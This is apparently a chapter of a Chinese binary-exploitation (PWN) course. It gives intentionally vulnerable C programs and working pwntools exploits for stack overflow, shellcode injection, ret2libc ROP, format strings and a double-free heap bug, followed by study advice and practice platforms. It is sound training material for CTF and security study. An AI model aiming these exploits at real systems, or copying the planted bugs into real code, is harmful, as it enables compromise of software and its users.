这些技术是二进制安全/PWN方向的核心，需要大量练习才能熟练掌握。


***
# 第09章 实战案例——C/C++漏洞利用

## 案例一：经典栈溢出——从入门到Exploit

### 目标程序

```c
// vuln1.c
#include <stdio.h>
#include <string.h>

void win() {
    printf("恭喜！你成功利用了栈溢出漏洞！\n");
    system("/bin/sh");
}

void vuln() {
    char buffer[64];
    printf("请输入密码: ");
    gets(buffer);  // 危险函数
    printf("你输入的是: %s\n", buffer);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

### 利用步骤

```bash
# Step 1: 编译（关闭安全保护）
gcc -g -fno-stack-protector -no-pie -z execstack -o vuln1 vuln1.c

# Step 2: 检查安全保护
checksec vuln1
# 输出：
# RELRO           STACK CANARY      NX            PIE
# No RELRO        No canary found   NX disabled   No PIE

# Step 3: 分析栈布局
# buffer[64] + saved_rbp[8] = 72字节
# 溢出72字节后覆盖返回地址

# Step 4: 获取win函数地址
objdump -d vuln1 | grep win
# 或使用readelf
readelf -s vuln1 | grep win

# Step 5: 编写exploit
python3 << 'EOF'
from pwn import *

elf = ELF('./vuln1')
win_addr = elf.symbols['win']
print(f"win地址: {hex(win_addr)}")

# 构造payload
payload = b'A' * 72       # 填充buffer + saved_rbp
payload += p64(win_addr)  # 覆盖返回地址为win

p = process('./vuln1')
p.sendline(payload)
p.interactive()
EOF
```

***
## 案例二：Shellcode注入——执行任意命令

### 目标程序

```c
// vuln2.c
#include <stdio.h>
#include <string.h>

void vuln() {
    char buffer[256];
    printf("输入数据: ");
    read(0, buffer, 512);  // 溢出！buffer只有256字节，但读取512字节
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

### Exploit编写

```python
from pwn import *

context.arch = 'amd64'

elf = ELF('./vuln2')

# 生成shellcode
shellcode = asm(shellcraft.sh())
print(f"Shellcode长度: {len(shellcode)}")

# 查找跳转到shellcode的gadget
# 方法1：如果有jmp rsp指令
jmp_rsp = asm('jmp rsp')
jmp_rsp_addr = next(elf.search(jmp_rsp))
print(f"jmp rsp地址: {hex(jmp_rsp_addr)}")

# 构造payload
offset = 256 + 8  # buffer + saved_rbp
payload = b'A' * offset
payload += p64(jmp_rsp_addr)  # 覆盖返回地址为jmp rsp
payload += shellcode           # shellcode紧跟在返回地址之后

p = process('./vuln2')
p.sendline(payload)
p.interactive()
```

***
## 案例三：ret2libc——绕过NX保护

### 目标程序

```c
// vuln3.c
#include <stdio.h>
#include <string.h>

void vuln() {
    char buffer[64];
    printf("输入: ");
    gets(buffer);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

### 利用步骤

```bash
# 编译（开启NX，关闭其他保护）
gcc -g -fno-stack-protector -no-pie -o vuln3 vuln3.c

# NX已开启，不能执行栈上的shellcode
# 使用ret2libc技术
```

```python
from pwn import *

elf = ELF('./vuln3')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Step 1: 泄露libc地址
# 通过puts打印puts@GOT的值
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# 第一次溢出：泄露puts的真实地址
payload1 = b'A' * 72
payload1 += p64(pop_rdi)       # pop rdi; ret
payload1 += p64(elf.got['puts'])  # puts@GOT
payload1 += p64(elf.plt['puts'])  # 调用puts
payload1 += p64(elf.symbols['main'])  # 返回main再次利用

p = process('./vuln3')
p.recvuntil(b'输入: ')
p.sendline(payload1)

# 接收泄露的地址
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
print(f"泄露的puts地址: {hex(leaked)}")

# Step 2: 计算libc基址
libc_base = leaked - libc.symbols['puts']
print(f"libc基址: {hex(libc_base)}")

system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

# Step 3: 第二次溢出调用system("/bin/sh")
p.recvuntil(b'输入: ')
payload2 = b'A' * 72
payload2 += p64(ret)           # 栈对齐
payload2 += p64(pop_rdi)       # pop rdi; ret
payload2 += p64(bin_sh_addr)   # "/bin/sh"
payload2 += p64(system_addr)   # system()

p.sendline(payload2)
p.interactive()
```

***
## 案例四：格式化字符串漏洞利用

### 目标程序

```c
// fmt_vuln.c
#include <stdio.h>

int secret = 0;

void vuln() {
    char buf[100];
    printf("输入: ");
    fgets(buf, sizeof(buf), stdin);
    printf(buf);  // 格式化字符串漏洞
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("secret地址: %p\n", &secret);
    vuln();
    if (secret == 0x41414141) {
        printf("成功！secret = 0x%x\n", secret);
        system("/bin/sh");
    }
    return 0;
}
```

### 利用步骤

```python
from pwn import *

p = process('./fmt_vuln')

# Step 1: 泄露secret地址
line = p.recvline().decode()
secret_addr = int(line.split(': ')[1], 16)
print(f"secret地址: {hex(secret_addr)}")

# Step 2: 确定偏移
# 发送特征值，找到在栈上的位置
p.recvuntil(b'输入: ')
p.sendline(b'AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p')
leak = p.recvline().decode()
print(f"泄露: {leak}")

# Step 3: 使用fmtstr_payload
p.recvuntil(b'输入: ')
payload = fmtstr_payload(6, {secret_addr: 0x41414141})
p.sendline(payload)

p.interactive()
```

***
## 案例五：堆利用入门——Fast Bin Attack

### 目标程序

```c
// heap_vuln.c - 简化的堆管理程序
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct Chunk {
    char data[64];
};

struct Chunk *chunks[10];

void alloc() {
    int idx;
    printf("索引: ");
    scanf("%d", &idx);
    if (idx < 0 || idx >= 10) return;
    chunks[idx] = malloc(64);
    printf("数据: ");
    read(0, chunks[idx]->data, 64);
}

void free_chunk() {
    int idx;
    printf("索引: ");
    scanf("%d", &idx);
    if (idx < 0 || idx >= 10) return;
    free(chunks[idx]);
    // 漏洞：没有将chunks[idx]置为NULL
}

void show() {
    int idx;
    printf("索引: ");
    scanf("%d", &idx);
    if (idx < 0 || idx >= 10) return;
    printf("数据: %s\n", chunks[idx]->data);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    while (1) {
        printf("1.分配 2.释放 3.查看 4.退出\n");
        int choice;
        scanf("%d", &choice);
        switch (choice) {
            case 1: alloc(); break;
            case 2: free_chunk(); break;
            case 3: show(); break;
            case 4: return 0;
        }
    }
}
```

### 利用思路

```python
from pwn import *

p = process('./heap_vuln')

def alloc(idx, data):
    p.sendline(b'1')
    p.sendline(str(idx).encode())
    p.send(data)

def free_c(idx):
    p.sendline(b'2')
    p.sendline(str(idx).encode())

def show(idx):
    p.sendline(b'3')
    p.sendline(str(idx).encode())

# Double Free攻击
# 1. 分配两个chunk
alloc(0, b'A' * 64)
alloc(1, b'B' * 64)

# 2. 释放chunk 0（进入fast bin）
free_c(0)

# 3. 再次释放chunk 0（Double Free！）
#    注意：实际中需要先释放其他chunk来绕过fast bin的检查
free_c(0)

# 4. 现在fast bin中有两个指向同一地址的chunk
# 5. 分配时会返回同一地址两次
# 6. 可以通过修改chunk header来在任意地址分配chunk
```

***
## 案例总结

| 案例 | 漏洞类型 | 难度 | 关键技术 |
|------|---------|------|---------|
| 经典栈溢出 | 栈溢出 | ★★ | 基本覆盖返回地址 |
| Shellcode注入 | 栈溢出 | ★★★ | jmp rsp + shellcode |
| ret2libc | 栈溢出 + NX | ★★★★ | 泄露libc + ROP |
| 格式化字符串 | 格式化字符串 | ★★★ | fmtstr_payload |
| 堆利用 | UAF/Double Free | ★★★★★ | Fast Bin Attack |

**练习建议：**
1. 从案例一开始，逐步增加难度
2. 每个案例都要自己动手写exploit
3. 使用GDB调试，理解每一步的内存变化
4. 在pwn.college、BUUCTF等平台找类似题目练习


***
# 第09章 常见误区——C/C++安全研究中的陷阱

## 误区一：只学理论不学实践

### 错误认知
很多初学者花大量时间看书、看视频，但不动手写代码和做题。

### 正确做法
- **理论和实践必须结合**：每学一个概念，立刻用GDB调试验证
- **从简单题目开始**：先做pwn.college的Intro级别
- **每天至少调试一个程序**：观察栈、堆、寄存器的变化
- **记录调试笔记**：把每次调试的观察写下来

### 学习比例建议
```text
理论学习 : 动手实践 = 3 : 7

每天的学习时间分配：
- 看书/文档：1小时
- 写代码/做题：2-3小时
- GDB调试验证：1小时
- 总结笔记：30分钟
```

***
## 误区二：忽视GDB调试

### 错误做法
- 只看代码，不调试
- 只用print调试，不用GDB
- 不会使用GDB插件（pwndbg/gef）

### 正确做法
```bash
# 必须掌握的GDB技能
1. 设置断点
2. 查看寄存器
3. 查看内存（栈、堆、全局区）
4. 单步执行
5. 使用pwndbg的高级命令

# 推荐GDB插件（三选一）
- pwndbg：功能全面，社区活跃
- gef：轻量级，启动快
- peda：经典，但更新较少
```

### 调试习惯
- **每个exploit都用GDB验证**：确认偏移、地址、payload正确
- **观察栈帧变化**：溢出前后对比
- **追踪指针**：从指针到实际数据，逐层解引用
- **记录关键地址**：GOT、PLT、libc基址等

***
## 误区三：不理解地址随机化（ASLR）

### 错误认知
- 认为ASLR让所有地址都随机化
- 不知道PIE和非PIE的区别
- 不会泄露地址绕过ASLR

### 正确理解
```text
ASLR随机化的范围：
├── 栈地址：随机化 ✓
├── 堆地址：随机化 ✓
├── libc地址：随机化 ✓
├── 程序地址（无PIE）：不随机化 ✗
└── 程序地址（有PIE）：随机化 ✓

绕过ASLR的方法：
1. 泄露某个已知地址，计算基址偏移
2. 部分覆写（Partial Overwrite）
3. 利用未随机化的段（如.plt、.got）
4. 爆破（32位系统，随机化熵较小）
```

### 实际操作
```python
# 泄露libc地址的方法
# 1. 通过puts打印GOT表
# 2. 通过格式化字符串泄露栈上的libc地址
# 3. 通过__libc_start_main泄露

# 计算偏移
libc_base = leaked_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
```

***
## 误区四：忽略栈对齐问题

### 错误现象
exploit看起来正确，但执行时崩溃或没有效果。

### 原因
x86-64要求16字节栈对齐。如果栈没有对齐，某些指令（如movaps）会触发段错误。

### 解决方案
```python
# 在ROP链中添加一个ret gadget来对齐栈
ret = rop.find_gadget(['ret'])[0]

payload = b'A' * offset
payload += p64(ret)       # 栈对齐
payload += p64(pop_rdi)   # 实际的ROP链开始
payload += p64(bin_sh)
payload += p64(system)
```

***
## 误区五：不检查编译选项

### 错误做法
拿到二进制文件就直接分析，不检查安全保护。

### 正确做法
```bash
# 拿到二进制后第一件事：检查安全保护
checksec vuln
# 或
checksec --file=vuln

# 输出示例：
# RELRO           STACK CANARY      NX            PIE
# Full RELRO      Canary found      NX enabled    PIE enabled

# 根据保护情况选择利用策略：
# - 无Canary → 直接栈溢出
# - 有Canary → 需要泄露canary或绕过
# - 无NX → 可以执行shellcode
# - 有NX → 需要ROP或ret2libc
# - 无PIE → 地址固定，直接利用
# - 有PIE → 需要泄露基址
```

***
## 误区六：只学一种利用方法

### 错误认知
认为栈溢出就是唯一的方法，或者只会一种利用方式。

### 正确做法
```text
漏洞利用方法大全：
├── 栈溢出
│   ├── 覆盖返回地址
│   ├── 覆盖局部变量
│   ├── Shellcode注入
│   ├── ROP链
│   └── ret2libc
├── 格式化字符串
│   ├── 信息泄露
│   └── 任意地址写入
├── 堆溢出
│   ├── Fast Bin Attack
│   ├── Unsorted Bin Attack
│   ├── House of系列
│   └── Tcache Poisoning（glibc 2.26+）
├── UAF
│   ├── 控制流劫持
│   └── 信息泄露
├── 整数溢出
│   ├── 堆溢出
│   └── 栈溢出
└── 其他
    ├── One Gadget
    ├── FSOP（File Stream Oriented Programming）
    └── SROP（Sigreturn Oriented Programming）
```

### 学习路径
```text
栈溢出基础 → Shellcode → ROP → ret2libc
    ↓
格式化字符串 → 堆利用入门 → 高级堆利用
    ↓
FSOP → SROP → 内核PWN
```

***
## 误区七：不理解One Gadget

### 什么是One Gadget
libc中存在一些位置，如果程序执行到这里且满足特定约束条件，就会直接执行`execve("/bin/sh", NULL, NULL)`。

### 使用方法
```bash
# 安装one_gadget工具
gem install one_gadget

# 查找libc中的one gadget
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# 输出示例：
# 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL
#
# 0x4f432 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL
```

### 优势
- 不需要构造复杂的ROP链
- 只需要覆盖返回地址为one gadget地址
- 但需要满足约束条件（可能需要调试找到合适的值）

***
## 误区八：不看源码，只看Writeup

### 错误做法
做CTF题目时，直接看别人的Writeup，不自己思考。

### 正确做法
1. **先自己尝试至少2小时**
2. **如果卡住，分析卡在哪里**：是思路问题还是技术问题
3. **看提示而非完整Writeup**：获取关键线索后继续自己做
4. **做完后复盘**：理解每一步的原理
5. **尝试改进exploit**：优化payload、减少交互次数

### Writeup的正确使用方式
```text
错误：直接看Writeup → 复制代码 → "会了"
正确：
1. 自己尝试 → 卡住
2. 看关键提示 → 继续尝试
3. 成功后 → 看其他人的Writeup对比
4. 学习更优雅的解法
5. 总结知识点
```

***
## 误区九：不考虑实际环境差异

### 常见问题
- exploit在本地成功，远程失败
- 不同libc版本的偏移不同
- 不同内核版本的保护机制不同

### 解决方案
```python
# 1. 使用与远程相同的libc版本
# 下载远程libc
# scp user@remote:/lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6

# 2. 使用patchelf修改程序的libc
# patchelf --set-interpreter ./ld-linux.so.2 ./vuln
# patchelf --set-rpath . ./vuln

# 3. 确认libc版本
# ldd vuln  # 查看使用的libc
# strings libc.so.6 | grep "GNU C Library"
```

***
## 误区十：不总结不复盘

### 错误做法
做完题目就不管了，不总结知识点，不记录解题过程。

### 正确做法
```text
每个题目的复盘模板：
1. 题目描述：目标是什么
2. 漏洞类型：栈溢出/格式化字符串/堆利用...
3. 保护机制：Canary/NX/PIE/RELRO
4. 利用思路：如何绕过保护
5. 关键步骤：泄露地址/构造payload/触发漏洞
6. 踩坑记录：遇到什么问题，如何解决
7. 知识收获：学到了什么新知识
8. 相关题目：类似的题目推荐
```

### 建立知识库
```text
我的PWN笔记/
├── 栈溢出/
│   ├── 基础栈溢出.md
│   ├── ROP.md
│   └── ret2libc.md
├── 格式化字符串/
│   ├── 基础利用.md
│   └── 高级技巧.md
├── 堆利用/
│   ├── Fast Bin.md
│   ├── Unsorted Bin.md
│   └── Tcache.md
└── 题目记录/
    ├── pwn_college/
    ├── buuctf/
    └── hackthebox/
```

***
## 总结

| 误区 | 核心教训 |
|------|---------|
| 只学理论不实践 | 动手做题才是真正的学习 |
| 忽视GDB调试 | 每个exploit都要用GDB验证 |
| 不理解ASLR | 学会泄露地址绕过随机化 |
| 忽略栈对齐 | 添加ret gadget对齐栈 |
| 不检查编译选项 | 第一步就是checksec |
| 只学一种方法 | 掌握多种利用技术 |
| 不理解One Gadget | 最简单的利用方式 |
| 只看Writeup | 先自己尝试再看答案 |
| 不考虑环境差异 | 使用相同的libc版本 |
| 不总结不复盘 | 建立自己的知识库 |


***
# 第09章 练习方法——C/C++安全研究学习路径

## 第一阶段：C语言基础（2-3周）

### 目标
熟练掌握C语言基础语法、指针、内存管理。

### 练习任务

**1. 基础语法**
```c
// 练习1：实现字符串操作函数
// 不使用string.h，自己实现：
size_t my_strlen(const char *s);
char *my_strcpy(char *dest, const char *src);
char *my_strcat(char *dest, const char *src);
int my_strcmp(const char *s1, const char *s2);

// 练习2：实现动态数组
typedef struct {
    int *data;
    size_t size;
    size_t capacity;
} Vector;

void vector_init(Vector *v);
void vector_push(Vector *v, int value);
int vector_get(Vector *v, size_t index);
void vector_free(Vector *v);
```

**2. 指针练习**
```c
// 练习3：实现链表
typedef struct Node {
    int data;
    struct Node *next;
} Node;

Node *create_node(int data);
void append(Node **head, int data);
void print_list(Node *head);
void free_list(Node *head);

// 练习4：函数指针
// 实现一个简单的回调机制
typedef void (*callback_t)(int);
void process_array(int *arr, size_t n, callback_t cb);
```

**3. 内存管理练习**
```c
// 练习5：实现简单的内存分配器
// 使用mmap获取大块内存，自己管理分配和释放
void *my_malloc(size_t size);
void my_free(void *ptr);

// 练习6：找出代码中的内存问题
// 使用valgrind检查
// valgrind --leak-check=full ./program
```

### 推荐资源
- **《C Primer Plus》**：C语言入门
- **CSAPP**：深入理解计算机系统
- **LeetCode C语言题**：每天2-3题

***
## 第二阶段：安全基础（3-4周）

### 目标
理解缓冲区溢出原理，能够利用简单的栈溢出漏洞。

### 练习任务

**1. 栈溢出入门**
```bash
# 在pwn.college上完成以下课程：
# 1. Introduction to Cybersecurity
# 2. Software Exploitation
#    - Buffer Overflow
#    - Return Oriented Programming

# 或在BUUCTF上做题：
# - pwn1_sctf_2016
# - ciscn_2019_n_1
# - get_started_3dsctf_2016
```

**2. GDB调试练习**
```bash
# 练习：用GDB调试栈溢出程序
# 1. 设置断点在vulnerable函数
# 2. 观察栈布局
# 3. 确定buffer到返回地址的偏移
# 4. 验证payload正确性

# 调试练习题：
cat > debug_exercise.c << 'EOF'
#include <stdio.h>
#include <string.h>

void secret() {
    system("/bin/sh");
}

void vuln() {
    char buf[32];
    gets(buf);
}

int main() {
    vuln();
    return 0;
}
EOF

gcc -g -fno-stack-protector -no-pie -o debug_exercise debug_exercise.c

# 任务：
# 1. 用GDB确定buf到返回地址的偏移
# 2. 找到secret函数的地址
# 3. 编写exploit获取shell
```

**3. pwntools练习**
```python
# 练习：使用pwntools完成基础exploit
from pwn import *

# 练习1：本地exploit
p = process('./vuln')
payload = b'A' * offset + p64(target_addr)
p.sendline(payload)
p.interactive()

# 练习2：远程exploit
p = remote('challenge.example.com', 1337)
# ... 同样的exploit代码

# 练习3：自动化exploit
# 根据不同输入自动生成payload
```

***
## 第三阶段：进阶技术（4-6周）

### 目标
掌握ROP、ret2libc、格式化字符串、堆利用基础。

### 练习任务

**1. ROP练习**
```bash
# 在ROP Emporium上完成：
# 1. ret2win（基础ROP）
# 2. split（ROP + 参数控制）
# 3. callme（多函数调用ROP）
# 4. write4（任意地址写入）
# 5. pivot（栈迁移）
# 6. ret2csu（利用__libc_csu_init）
```

**2. ret2libc练习**
```python
# 练习：绕过NX保护
# 步骤：
# 1. 泄露libc地址（通过puts打印GOT表）
# 2. 计算libc基址
# 3. 构建ret2libc的ROP链

# 推荐题目：
# - BUUCTF: ciscn_2019_c_1（ret2libc入门）
# - BUUCTF: babyheap_0_2017（堆利用入门）
```

**3. 格式化字符串练习**
```python
# 练习：格式化字符串漏洞利用
# 1. 确定偏移
# 2. 信息泄露
# 3. 任意地址写入

# 推荐题目：
# - pwn.college: Format Strings
# - BUUCTF: ciscn_2019_en_2
```

**4. 堆利用入门**
```bash
# 在How2Heap上完成：
# 1. first_fit
# 2. fastbin_dup
# 3. fastbin_dup_into_stack
# 4. house_of_spirit
# 5. poison_null_byte
```

***
## 第四阶段：高级技术（持续学习）

### 目标
掌握高级堆利用、内核PWN、浏览器安全等。

### 练习方向

**1. 高级堆利用**
```text
学习内容：
- Tcache Poisoning（glibc 2.26+）
- Large Bin Attack
- House of系列（Orange, Lore, Einherjar等）
- FSOP（File Stream Oriented Programming）
- Safe Linking绕过（glibc 2.32+）

推荐平台：
- pwn.college: Heap Exploitation
- CTF题目中的堆利用题
```

**2. 内核PWN**
```text
学习内容：
- 内核模块漏洞
- 内核堆利用
- ret2usr
- SMEP/SMAP绕过

推荐平台：
- pwn.college: Kernel Security
- CTF内核题
```

**3. 浏览器安全**
```text
学习内容：
- V8引擎漏洞
- TurboFan优化器漏洞
- Type Confusion
- Fake Object

推荐资源：
- LiveOverflow的Browser Exploitation系列
- Google Project Zero博客
```

***
## 学习方法论

### 1. 刻意练习法
```text
每个知识点的练习流程：
1. 理论学习（1小时）
2. GDB验证（1小时）
3. 做题练习（2-3小时）
4. 总结复盘（30分钟）
5. 写博客/笔记（30分钟）
```

### 2. 调试驱动学习
```bash
# 每次做题的调试流程：
1. checksec检查保护
2. IDA/Ghidra静态分析
3. GDB动态调试
4. 确定漏洞点和利用思路
5. 编写exploit
6. 调试exploit直到成功
7. 总结知识点
```

### 3. 知识图谱法
```text
建立自己的知识图谱：
├── 栈溢出
│   ├── 基础覆盖返回地址
│   ├── ROP
│   ├── ret2libc
│   ├── ret2csu
│   └── 栈迁移
├── 格式化字符串
│   ├── 信息泄露
│   ├── 任意写入
│   └── 高级技巧
├── 堆利用
│   ├── Fast Bin
│   ├── Unsorted Bin
│   ├── Tcache
│   └── House of系列
└── 其他
    ├── 整数溢出
    ├── UAF
    └── C++特有漏洞
```

***
## 推荐练习平台

### 入门级
| 平台 | 特点 | 推荐度 |
|------|------|-------|
| pwn.college | 系统化教学，免费 | ★★★★★ |
| ROP Emporium | ROP专项练习 | ★★★★ |
| How2Heap | 堆利用入门 | ★★★★ |
| CTFHub | 中文友好，有教程 | ★★★★ |

### 进阶级
| 平台 | 特点 | 推荐度 |
|------|------|-------|
| BUUCTF | 大量PWN题目 | ★★★★★ |
| CTFTime | 国际CTF赛事 | ★★★★ |
| HackTheBox | 综合安全挑战 | ★★★★ |
| VulnHub | 虚拟机靶场 | ★★★ |

### 高阶级
| 平台 | 特点 | 推荐度 |
|------|------|-------|
| Real World CTF | 真实世界漏洞 | ★★★★★ |
| Google CTF | 高质量题目 | ★★★★ |
| DEF CON CTF | 最顶级CTF | ★★★★ |

***
## 每日练习建议

| 时间段 | 内容 | 时长 |
|-------|------|------|
| 上午 | 理论学习（看书/文档/Writeup） | 1.5小时 |
| 下午 | GDB调试 + 做题 | 3小时 |
| 晚上 | 继续做题或研究新知识 | 2小时 |
| 睡前 | 总结笔记，规划明天 | 30分钟 |

**关键原则：**
- 每天至少调试一个程序
- 每周至少完成3道PWN题
- 每月至少写一篇技术博客
- 每季度至少参加一次CTF比赛

***
## 推荐学习路线图

```text
第1-2周：C语言基础 + 指针 + 内存管理
    ↓
第3-4周：栈溢出基础 + GDB调试 + pwntools
    ↓
第5-6周：ROP + ret2libc + Shellcode
    ↓
第7-8周：格式化字符串 + 堆利用入门
    ↓
第9-12周：高级堆利用 + C++漏洞
    ↓
持续：内核PWN + 浏览器安全 + 实战演练
```


***
# 第09章 本章小结

## 核心知识点回顾

本章系统讲解了C/C++在安全研究中的核心知识，从内存模型到漏洞利用，构建了完整的二进制安全知识体系。

### 1. C/C++在安全领域的地位

C/C++是安全研究的基石语言：
- **操作系统内核**全部用C编写
- **底层漏洞原理**（缓冲区溢出、UAF、整数溢出）全部基于C
- **90%+的恶意软件**用C/C++编写
- **逆向工程**的目标就是C代码
- **CTF/PWN竞赛**的核心考察语言

### 2. 理论基础要点

**内存模型**：
- 栈（Stack）：局部变量、函数参数、返回地址，向下增长
- 堆（Heap）：动态分配内存，向上增长
- 全局区（.data/.bss）：全局变量
- 代码段（.text）：程序代码

**指针**：指针的本质是存储内存地址的变量，是所有底层漏洞的根源。

**内存管理**：malloc/free的工作原理，堆管理器的bin机制（fast bin、unsorted bin、small bin、large bin）。

**编译链接**：从源代码到可执行文件的四个阶段（预处理→编译→汇编→链接），ELF文件格式。

### 3. 核心技巧总结

| 技术 | 原理 | 应用 |
|------|------|------|
| 栈溢出 | 覆盖返回地址 | 控制程序执行流 |
| Shellcode注入 | 在栈/堆上执行代码 | 获取shell |
| ROP | 利用已有代码片段 | 绕过NX保护 |
| ret2libc | 调用libc中的函数 | 绕过NX保护 |
| 格式化字符串 | 读写栈上的数据 | 信息泄露/任意写入 |
| 整数溢出 | 整数运算超出范围 | 堆溢出/栈溢出 |
| UAF | 释放后继续使用 | 控制流劫持 |
| 堆利用 | 利用堆管理器漏洞 | 任意地址分配 |
| GOT覆写 | 修改GOT表 | 劫持函数调用 |
| One Gadget | libc中的特殊地址 | 简化利用 |

### 4. 安全保护机制

| 保护机制 | 原理 | 绕过方法 |
|---------|------|---------|
| Stack Canary | 栈上插入随机值 | 信息泄露/爆破 |
| NX/DEP | 禁止执行栈/堆代码 | ROP/ret2libc |
| ASLR/PIE | 地址随机化 | 信息泄露 |
| RELRO | 保护GOT表 | 其他写入原语 |

### 5. 常见误区警示

- **只学理论不实践**：动手做题才是真正的学习
- **忽视GDB调试**：每个exploit都要用GDB验证
- **不理解ASLR**：学会泄露地址绕过随机化
- **忽略栈对齐**：添加ret gadget对齐栈
- **不检查编译选项**：第一步就是checksec
- **只学一种方法**：掌握多种利用技术
- **不总结不复盘**：建立自己的知识库

## 关键能力检查清单

学习完本章后，你应该能够：

- [ ] 理解进程内存布局（栈、堆、全局区、代码段）
- [ ] 熟练使用GDB/pwndbg调试程序
- [ ] 识别常见的危险函数（gets、strcpy、printf等）
- [ ] 利用栈溢出覆盖返回地址
- [ ] 使用pwntools编写exploit
- [ ] 构建ROP链执行任意操作
- [ ] 实现ret2libc绕过NX保护
- [ ] 利用格式化字符串漏洞
- [ ] 理解堆管理器的基本机制
- [ ] 进行基础的堆利用（Fast Bin Attack）

## 下一步学习方向

完成本章后，建议按以下顺序继续学习：

1. **第10章 JS/TS/Go/Rust/Assembly**：扩展语言技能，掌握Web安全和现代系统编程
2. **第16章 二进制安全（PWN）**：深入学习高级堆利用、内核PWN等
3. **第17章 逆向工程**：将C/C++知识应用于逆向分析
4. **第24章 恶意软件分析**：分析用C/C++编写的恶意软件

## 推荐工具速查

| 工具 | 用途 | 安装 |
|------|------|------|
| pwntools | PWN/exploit开发 | `pip install pwntools` |
| pwndbg | GDB插件 | `git clone pwndbg && ./setup.sh` |
| ROPgadget | 查找ROP gadgets | `pip install ROPgadget` |
| ropper | 查找ROP gadgets | `pip install ropper` |
| one_gadget | 查找one gadget | `gem install one_gadget` |
| Ghidra | 反汇编器 | https://ghidra-sre.org/ |
| IDA Pro | 反汇编器（收费） | https://hex-rays.com/ |
| checksec | 检查安全保护 | `apt install checksec` |

## 学习建议

> **"不理解内存，就不可能真正理解安全漏洞。"**
>
> C/C++安全研究的核心是理解内存。每次做题时，都要用GDB观察内存变化，理解每一步操作对内存的影响。当你能够在脑海中清晰地描绘出栈帧的布局、堆chunk的结构、寄存器的值时，你就真正掌握了二进制安全。
>
> 记住：**调试是学习二进制安全的最佳方式**。每天至少花1小时用GDB调试程序，观察内存变化，这是提升最快的方法。
